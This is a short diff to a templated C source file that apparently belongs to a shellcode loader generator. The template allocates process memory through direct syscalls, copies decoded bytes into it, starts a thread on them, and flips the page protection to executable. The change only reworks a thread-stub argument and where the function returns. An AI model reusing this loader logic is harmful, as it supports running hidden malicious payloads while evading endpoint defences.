@@ -12,17 +12,16 @@
         {% if protection == "rx" %}
             {{ syscall_call("ZwAllocateVirtualMemory", "(HANDLE)-1,&mem, NULL,&length,MEM_COMMIT,PAGE_READWRITE") }}
             memcpy(mem, decoded, length);
-            {{ createThreadStub("local", "mem", "mem") }}
+            {{ createThreadStub("mem", "mem") }}
 
             DWORD oldProt;
             {{ syscall_call("NtProtectVirtualMemory", "(HANDLE)-1,&mem, &szWmResv,PAGE_EXECUTE_READ,&oldProt") }}
-            return mem;
         {% else %}
             {{ syscall_call("ZwAllocateVirtualMemory", "(HANDLE)-1,&mem, NULL,&length,MEM_COMMIT,PAGE_EXECUTE_READWRITE") }}
             memcpy(mem, decoded, length);
-            {{ createThreadStub("local", "mem", "mem") }}
-            return mem;
+            {{ createThreadStub("mem", "mem") }}
         {% endif %}
+        return mem;
     }
 {% else %}
     {# Here goes alloc function call #}
